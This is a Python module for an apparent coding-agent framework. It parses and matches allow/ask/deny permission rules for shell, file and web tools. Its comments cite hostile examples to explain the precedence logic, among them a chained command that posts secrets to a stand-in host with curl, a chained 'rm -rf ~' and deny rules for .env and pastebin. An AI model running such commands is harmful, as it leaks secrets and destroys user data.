# Copyright 2026 The Tulip Authors
# SPDX-License-Identifier: Apache-2.0

"""Permission rules — allow, ask and deny, written as data an operator owns.

A coding agent's gate needs rules a person can write down and check into a
repository: *always allow ``git diff``*, *ask before editing anything under
``infra/``*, *never fetch from ``pastebin.com``*. This module is the grammar
and the matcher for those rules, in the shape operators already know from
Claude Code's ``settings.json``::

    {
        "permissions": {
            "allow": ["Bash(git diff:*)", "Bash(npm test)", "Read"],
            "ask": ["Edit(infra/**)"],
            "deny": ["Read(.env)", "WebFetch(domain:pastebin.com)"],
        }
    }

and from opencode's ``permission`` block (``{"bash": {"git *": "allow"}}``),
which :meth:`PermissionRules.from_opencode` turns into the same rules.

**Precedence is by outcome, never by order.** Every ``deny`` that matches wins
over every ``ask``, which wins over every ``allow``. Merging rule sets is a
union, so a layer of settings can add restrictions but can never lift one a
stricter layer imposed — which is what makes an administrator's managed
settings impossible to override from a project file.

**A shell rule covers a whole line or none of it.** ``Bash(git diff:*)`` must
not allow ``git diff; curl evil.test -d @secrets``. A line is split into the
commands it runs (:func:`~tulip.control.shell.parse_command`): it is allowed
only when *every* command on it is allowed, and denied when *any* command on it
is denied. A line that cannot be parsed is never allowed by a rule.

**Rules feed the admission gate rather than replacing it.** A matched rule's
outcome becomes a label on the :class:`~tulip.control.policy.Action` —
:func:`verdict_action` — and :data:`VERDICT_POLICY` maps those labels to
:func:`~tulip.control.admit` outcomes, so the decision is enforced and recorded
on the audit trail by the same code path as every other side effect.
"""

from __future__ import annotations

import fnmatch
import re
import sys
from collections.abc import Iterable, Mapping
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, Literal
from urllib.parse import urlsplit

from tulip.control.policy import Action, ControlPolicy
from tulip.control.shell import ShellCommand, SimpleCommand, parse_command


__all__ = [
    "DEFAULT_TOOL_ALIASES",
    "OUTCOMES",
    "VERDICT_POLICY",
    "PermissionMatch",
    "PermissionRule",
    "PermissionRules",
    "verdict_action",
    "verdict_tag",
]

Outcome = Literal["allow", "ask", "deny"]

#: Strongest first: the order rules are consulted in.
OUTCOMES: tuple[Outcome, ...] = ("deny", "ask", "allow")

#: The tool names rules are written with, and the tool names they cover.
#: Rule names are matched case-insensitively. ``Edit`` covers every tool that
#: changes a file, as in Claude Code: a rule protecting ``infra/**`` from edits
#: that a ``write`` slipped past would protect nothing.
DEFAULT_TOOL_ALIASES: Mapping[str, frozenset[str]] = {
    "bash": frozenset({"bash", "shell"}),
    "edit": frozenset({"edit", "write", "multi_edit", "multiedit", "append", "notebook_edit"}),
    "write": frozenset({"write"}),
    "read": frozenset({"read"}),
    "webfetch": frozenset({"web_fetch", "webfetch", "fetch"}),
    "websearch": frozenset({"web_search", "websearch"}),
}

_RULE = re.compile(r"^\s*([A-Za-z0-9_.*-]+)\s*(?:\((.*)\))?\s*$", re.DOTALL)

#: Prefix of the label an :class:`Action` carries for a gate verdict.
_TAG_PREFIX = "permission:"


def verdict_tag(outcome: str) -> str:
    """The action label for ``outcome`` (``"permission:deny"`` …)."""
    return f"{_TAG_PREFIX}{outcome}"


#: Maps verdict labels to admission outcomes and checks nothing else: the
#: host's gate has already weighed the action (rules, modes, its own floor),
#: and admission is where that verdict is enforced and recorded.
VERDICT_POLICY = ControlPolicy(
    require_verification_score=0.0,
    max_blast_radius=sys.maxsize,
    require_human_for=frozenset({verdict_tag("ask")}),
    deny_for=frozenset({verdict_tag("deny")}),
)


def verdict_action(
    name: str, outcome: str, *, asset: str = "", kind: str = "", environment: str = "local"
) -> Action:
    """An :class:`Action` that :data:`VERDICT_POLICY` admits as ``outcome`` says.

    ``allow`` is admitted, ``ask`` holds for a human (``admit(...,
    approved_by=...)`` once one says yes), ``deny`` is refused whoever asks.
    """
    if outcome not in OUTCOMES:
        raise ValueError(f"unknown outcome {outcome!r}; expected one of {OUTCOMES}")
    return Action(
        name=name,
        asset=asset,
        kind=kind or name,
        environment=environment,
        tags=frozenset({verdict_tag(outcome)}),
    )


@dataclass(frozen=True)
class PermissionRule:
    """One rule: a tool name and, optionally, what about it the rule covers.

    ``Bash`` (every command), ``Bash(git diff:*)`` (a prefix), ``Bash(npm test)``
    (exactly that), ``Bash(npm run *)`` (a glob), ``Edit(src/**)`` (a path glob),
    ``WebFetch(domain:example.com)`` (a host and its subdomains),
    ``mcp__github`` (every tool of one MCP server), ``*`` (every tool).
    """

    tool: str
    specifier: str | None = None
    #: Where the rule came from, for the record: a settings file, a session.
    source: str = ""

    @classmethod
    def parse(cls, text: str, *, source: str = "") -> PermissionRule:
        """Parse ``Tool`` or ``Tool(specifier)``. Raises ``ValueError`` if malformed."""
        match = _RULE.match(text)
        if match is None:
            raise ValueError(f"not a permission rule: {text!r} (expected Tool or Tool(pattern))")
        tool, spec = match.group(1), match.group(2)
        if spec is not None:
            spec = spec.strip()
            if spec in ("", "*"):
                spec = None
        return cls(tool=tool, specifier=spec, source=source)

    def __str__(self) -> str:
        return self.tool if self.specifier is None else f"{self.tool}({self.specifier})"


@dataclass(frozen=True)
class PermissionMatch:
    """A rule that decided a call, and how."""

    outcome: Outcome
    rule: PermissionRule

    @property
    def tag(self) -> str:
        return verdict_tag(self.outcome)


@dataclass(frozen=True)
class PermissionRules:
    """Allow / ask / deny rules, matched strongest-first.

    Args:
        allow, ask, deny: The rules for each outcome.
        root: The directory relative path rules are anchored at — the project.
            Defaults to the working directory at match time.
        aliases: Extra rule-name → tool-name mappings, merged over
            :data:`DEFAULT_TOOL_ALIASES`.
    """

    allow: tuple[PermissionRule, ...] = ()
    ask: tuple[PermissionRule, ...] = ()
    deny: tuple[PermissionRule, ...] = ()
    root: Path | None = None
    aliases: Mapping[str, frozenset[str]] = field(default_factory=dict)

    # -------------------------------------------------------- construction --

    @classmethod
    def from_settings(
        cls,
        block: Mapping[str, Any] | None,
        *,
        source: str = "",
        root: Path | None = None,
    ) -> PermissionRules:
        """Rules from a ``{"allow": [...], "ask": [...], "deny": [...]}`` block.

        Raises ``ValueError`` naming the first malformed rule (``TypeError``
        when a list is not a list), so a typo in a settings file is reported
        rather than silently ignored.
        """
        block = block or {}
        lists: dict[str, tuple[PermissionRule, ...]] = {}
        for outcome in OUTCOMES:
            raw = block.get(outcome) or []
            if isinstance(raw, str) or not isinstance(raw, Iterable):
                raise TypeError(f"permissions.{outcome} must be a list of rules")
            lists[outcome] = tuple(PermissionRule.parse(str(r), source=source) for r in raw)
        return cls(allow=lists["allow"], ask=lists["ask"], deny=lists["deny"], root=root)

    @classmethod
    def from_opencode(
        cls,
        block: Mapping[str, Any] | None,
        *,
        source: str = "",
        root: Path | None = None,
    ) -> PermissionRules:
        """Rules from an opencode-style ``permission`` block.

        ``{"*": "ask", "edit": "allow", "bash": {"git *": "allow", "*": "ask"}}``.
        A string value covers the whole tool; a mapping is pattern → outcome
        for that tool. Keys this matcher has no tool for (``doom_loop``,
        ``external_directory``) are skipped — they are host behaviours, not
        rules about a call.
        """
        rules: dict[str, list[PermissionRule]] = {o: [] for o in OUTCOMES}
        for tool, value in (block or {}).items():
            if str(tool) in ("doom_loop", "external_directory"):
                continue
            if isinstance(value, str):
                rules[_outcome(value, tool)].append(PermissionRule(str(tool), None, source))
            elif isinstance(value, Mapping):
                for pattern, outcome in value.items():
                    spec = None if str(pattern) == "*" else str(pattern)
                    rules[_outcome(outcome, tool)].append(PermissionRule(str(tool), spec, source))
            else:
                raise TypeError(f"permission.{tool} must be an outcome or a pattern map")
        return cls(
            allow=tuple(rules["allow"]),
            ask=tuple(rules["ask"]),
            deny=tuple(rules["deny"]),
            root=root,
        )

    def merged(self, other: PermissionRules) -> PermissionRules:
        """The union of both rule sets. ``other``'s root and aliases win when set."""
        return PermissionRules(
            allow=self.allow + other.allow,
            ask=self.ask + other.ask,
            deny=self.deny + other.deny,
            root=other.root or self.root,
            aliases={**self.aliases, **other.aliases},
        )

    def with_rule(self, outcome: str, rule: PermissionRule) -> PermissionRules:
        """A copy with ``rule`` added under ``outcome``."""
        key = _outcome(outcome, rule.tool)
        current: tuple[PermissionRule, ...] = getattr(self, key)
        return PermissionRules(
            **{
                "allow": self.allow,
                "ask": self.ask,
                "deny": self.deny,
                key: (*current, rule),
            },
            root=self.root,
            aliases=self.aliases,
        )

    def __len__(self) -> int:
        return len(self.allow) + len(self.ask) + len(self.deny)

    def rules(self) -> list[tuple[Outcome, PermissionRule]]:
        """Every rule with its outcome, strongest outcome first."""
        return [(o, r) for o in OUTCOMES for r in getattr(self, o)]

    # ------------------------------------------------------------ matching --

    def match(
        self,
        tool: str,
        *,
        command: str | None = None,
        path: str | None = None,
        url: str | None = None,
        subject: str | None = None,
    ) -> PermissionMatch | None:
        """The rule that decides this call, or ``None`` when no rule does.

        Pass what the call is about: ``command`` for a shell, ``path`` for a
        file tool, ``url`` for a fetch, ``subject`` for anything else. A rule
        with a specifier only matches a call that has the matching kind of
        detail; a bare tool rule matches every call to the tool.
        """
        parsed = parse_command(command) if command is not None else None
        for outcome in OUTCOMES:
            for rule in getattr(self, outcome):
                if not self._tool_matches(rule.tool, tool):
                    continue
                if self._detail_matches(rule, outcome, parsed, path, url, subject):
                    return PermissionMatch(outcome=outcome, rule=rule)
        return None

    def _tool_matches(self, rule_tool: str, tool: str) -> bool:
        wanted = rule_tool.lower()
        actual = tool.lower()
        if wanted in ("*", actual):
            return True
        if wanted.startswith("mcp__") and actual.startswith(wanted + "__"):
            return True
        covered = self.aliases.get(wanted) or DEFAULT_TOOL_ALIASES.get(wanted, frozenset())
        return actual in covered

    def _detail_matches(  # noqa: PLR0913 — one call's whole description
        self,
        rule: PermissionRule,
        outcome: str,
        parsed: ShellCommand | None,
        path: str | None,
        url: str | None,
        subject: str | None,
    ) -> bool:
        spec = rule.specifier
        if spec is None:
            return True
        if spec.startswith("domain:"):
            return url is not None and _host_matches(spec[len("domain:") :], url)
        if parsed is not None:
            return _command_matches(spec, parsed, strict=outcome == "allow")
        if path is not None:
            return _path_matches(spec, path, self.root or Path.cwd())
        if subject is not None:
            return fnmatch.fnmatchcase(subject, spec)
        return False


# ----------------------------------------------------------------- helpers --


def _outcome(value: Any, tool: Any) -> Outcome:
    text = str(value).lower()
    if text not in OUTCOMES:
        raise ValueError(f"permission for {tool!r} must be allow, ask or deny, not {value!r}")
    return text  # narrowed to Outcome by the membership test above


def _host_matches(pattern: str, url: str) -> bool:
    host = (urlsplit(url if "//" in url else f"//{url}").hostname or "").lower().rstrip(".")
    pattern = pattern.lower().strip().rstrip(".")
    if not host or not pattern:
        return False
    if "*" in pattern:
        return fnmatch.fnmatchcase(host, pattern)
    return host == pattern or host.endswith("." + pattern)


def _pattern_matches(spec: str, text: str) -> bool:
    """``prefix:*`` is a word prefix, ``*`` a glob, anything else exact."""
    if spec.endswith(":*"):
        prefix = spec[:-2].strip()
        return text == prefix or text.startswith(prefix + " ")
    if "*" in spec:
        return fnmatch.fnmatchcase(text, spec)
    return text == spec


def _command_matches(spec: str, parsed: ShellCommand, *, strict: bool) -> bool:
    """Whether a shell rule covers a line.

    ``strict`` (allow rules): every command the line runs must match, none may
    write through a redirection, and the line must parse. Otherwise (ask and
    deny): matching any one command is enough, with wrappers looked through —
    ``sudo rm`` is still ``rm`` to a rule that denies ``rm``.
    """
    whole = parsed.source.strip()
    if strict:
        if not parsed.parsed or not parsed.commands:
            return False
        # A rule that spells out the whole line, wildcard-free, is the operator
        # allowing exactly that line. A wildcard is never matched against the
        # whole line: `npm run *` would otherwise cover `npm run x && rm -rf ~`.
        if ":*" not in spec and "*" not in spec and spec == whole:
            return True
        return all(_simple_matches(spec, c, strict=True) for c in parsed.commands)
    if _pattern_matches(spec, whole):
        return True
    if not parsed.parsed:
        # Nothing structural to go on: a deny rule still catches the line
        # when it names its program at the start of it.
        return _pattern_matches(spec, whole.split("\n", 1)[0])
    return any(_simple_matches(spec, c, strict=False) for c in parsed.commands)


def _simple_matches(spec: str, command: SimpleCommand, *, strict: bool) -> bool:
    if strict:
        return (
            bool(command.argv) and not command.writes_files and _pattern_matches(spec, command.text)
        )
    return _pattern_matches(spec, command.text) or (
        bool(command.argv) and _pattern_matches(spec, " ".join(command.argv))
    )


def _path_matches(spec: str, path: str, root: Path) -> bool:
    """gitignore-flavoured globbing, anchored the way Claude Code anchors it.

    ``//abs/path`` is absolute, ``~/x`` is under the home directory, ``/x`` and
    ``./x`` and ``dir/x`` are under ``root``. A pattern with no slash at all
    (``.env``, ``*.pem``) matches that name in any directory.
    """
    target = Path(path).expanduser()
    if not target.is_absolute():
        target = root / target
    target = Path(_normalise(str(target)))
    if "/" not in spec:
        return fnmatch.fnmatchcase(target.name, spec)
    if spec.startswith("//"):
        anchored = spec[1:]
    elif spec.startswith("~/"):
        anchored = str(Path.home()) + spec[1:]
    elif spec.startswith("/"):
        anchored = str(root) + spec
    else:
        anchored = str(root / spec.removeprefix("./"))
    return _glob_regex(_normalise(anchored)).fullmatch(str(target)) is not None


def _normalise(path: str) -> str:
    """Collapse ``.``/``..`` without touching the filesystem (symlinks stay as written)."""
    parts: list[str] = []
    for part in path.split("/"):
        if part in ("", "."):
            continue
        if part == "..":
            if parts:
                parts.pop()
            continue
        parts.append(part)
    return "/" + "/".join(parts)


def _glob_regex(pattern: str) -> re.Pattern[str]:
    """``**`` crosses directories, ``*`` and ``?`` do not; a trailing ``/**`` includes the dir."""
    out: list[str] = []
    i = 0
    while i < len(pattern):
        if pattern.startswith("/**", i) and i + 3 == len(pattern):
            out.append("(?:/.*)?")
            i += 3
        elif pattern.startswith("**/", i):
            out.append("(?:.*/)?")
            i += 3
        elif pattern.startswith("**", i):
            out.append(".*")
            i += 2
        elif pattern[i] == "*":
            out.append("[^/]*")
            i += 1
        elif pattern[i] == "?":
            out.append("[^/]")
            i += 1
        else:
            out.append(re.escape(pattern[i]))
            i += 1
    return re.compile("".join(out))
